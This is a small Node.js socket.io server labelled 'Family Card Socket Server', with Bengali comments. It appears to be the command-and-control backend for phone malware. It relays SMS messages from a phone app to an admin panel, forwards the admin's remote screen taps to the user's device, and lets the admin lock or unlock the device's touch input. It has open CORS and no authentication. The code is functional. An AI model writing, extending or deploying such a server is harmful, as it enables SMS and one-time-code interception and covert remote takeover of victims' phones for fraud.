const express = require('express');
const http = require('http');
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// বেসিক রুট চেক করার জন্য
app.get('/', (req, res) => {
    res.send('Family Card Socket Server is Running Successfully!');
});

io.on('connection', (socket) => {
    console.log('Client connected: ' + socket.id);

    // ১. অ্যাপ থেকে এসএমএস রিসিভ করার ইভেন্ট
    socket.on('send-sms-to-admin', (smsMessage) => {
        console.log("New SMS: " + smsMessage);
        io.emit('receive-sms-from-app', smsMessage);
    });

    // ২. 🖱️ এডমিন প্যানেল থেকে রিমোট ক্লিক আসলে তা ইউজারের অ্যাপে পাঠানো
    socket.on('admin-remote-click', (data) => {
        console.log("Admin clicked at X: " + data.x + ", Y: " + data.y);
        io.emit('remote-click', data.x, data.y);
    });

    // ৩. 🔒 এডমিন প্যানেল থেকে স্ক্রিন লক বা আনলক কমান্ড পাঠানো
    socket.on('admin-lock-touch', (shouldLock) => {
        console.log("Screen lock status: " + shouldLock);
        io.emit('lock-touch', shouldLock);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected: ' + socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
